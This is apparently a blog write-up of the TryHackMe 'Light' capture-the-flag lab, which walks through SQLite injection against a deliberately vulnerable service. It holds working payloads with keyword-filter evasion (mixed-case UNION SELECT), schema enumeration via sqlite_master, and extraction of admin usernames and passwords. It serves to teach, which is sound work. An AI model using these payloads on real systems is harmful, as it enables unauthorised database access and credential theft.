---
title: "Challenges: Light (TryHackMe)"
datePublished: Fri Aug 01 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmevrcza3000802l2dbv67dpx
slug: challenges-light-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756406892580/d1bb4edd-3104-459d-9236-232adeb9deb4.png
tags: database, sql, tryhackme, sqlinjection, ctf-writeup

---

The “Light” challenge simulates a database application that is vulnerable to SQL injection. By connecting to the service running on port 1337, we’re able to interact with the backend through user input. The goal is to enumerate the database, extract sensitive information such as usernames and passwords, and ultimately retrieve the hidden flag. This task emphasizes the importance of secure query handling and input validation.

I am working on a database application called Light! Would you like to try it out?  
If so, the application is running on **port 1337**. You can connect to it using `nc MACHINE_IP 1337`  
You can use the username `smokey` in order to get started.

**Note:** Please allow the service 2 - 3 minutes to fully start before connecting to it.

## Answer the questions below

### What is the admin username?

nmap -sV IP\_Address

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756406000384/0fd3e9bb-479e-469f-b059-73dbe3cf95c4.png align="center")

`nc 10.10.87.187 1337` Welcome to the Light database! Please enter your username: smokey Password: vYQ5ngPpw8AdUmL

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756406039828/95e5e43c-787c-41d6-972f-8c436ec902c8.png align="center")

### What is the password to the username mentioned in question 1?

`' OR 1=1 --` For strange reasons I can't explain, any input containing /\*, -- or, %0b is not allowed :)

`' union` Ahh there is a word in there I don't like :(

`' UnION` Error: unrecognized token: "' LIMIT 30"

`' UnION SeleCT 1 '` Password: 1

`' UnION SeleCT version() '` Error: no such function: version

`' UnION SeleCT sqlite_version() '` Password: 3.31.1

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756406125091/41be6c1e-c4dc-40bd-bf7b-57bea98e2eb7.png align="center")

### What is the flag?

`' UnION SeleCT group_concat(sql) from sqlite_master'` Password: CREATE TABLE usertable ( id INTEGER PRIMARY KEY, username TEXT, password INTEGER),CREATE TABLE admintable ( id INTEGER PRIMARY KEY, username TEXT, password INTEGER)

`' UnION SeleCT group_concat(sql) from sqlite_master'`

Password: CREATE TABLE usertable ( id INTEGER PRIMARY KEY, username TEXT, password INTEGER),CREATE TABLE admintable ( id INTEGER PRIMARY KEY, username TEXT, password INTEGER)

`' UnION SeleCT group_concat(username) from admintable '` Password: TryHackMeAdmin,flag

`' UnION SeleCT group_concat(password) from admintable '`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756406195962/7ebd780e-e8a5-4c28-b488-12f982e468a9.png align="center")

These resources were helpful:

* [https://systemweakness.com/light-thm-ctf-walkthrough-bf8fe9468ee8](https://systemweakness.com/light-thm-ctf-walkthrough-bf8fe9468ee8)
    
* [https://chatgpt.com/](https://chatgpt.com/)
    

Through SQL injection, we successfully bypassed authentication, enumerated database tables, and uncovered the administrator’s credentials along with the final flag. This challenge demonstrates how a single overlooked vulnerability in input sanitization can lead to full database compromise. Proper use of parameterized queries and input filtering is crucial to prevent such attacks in real-world applications.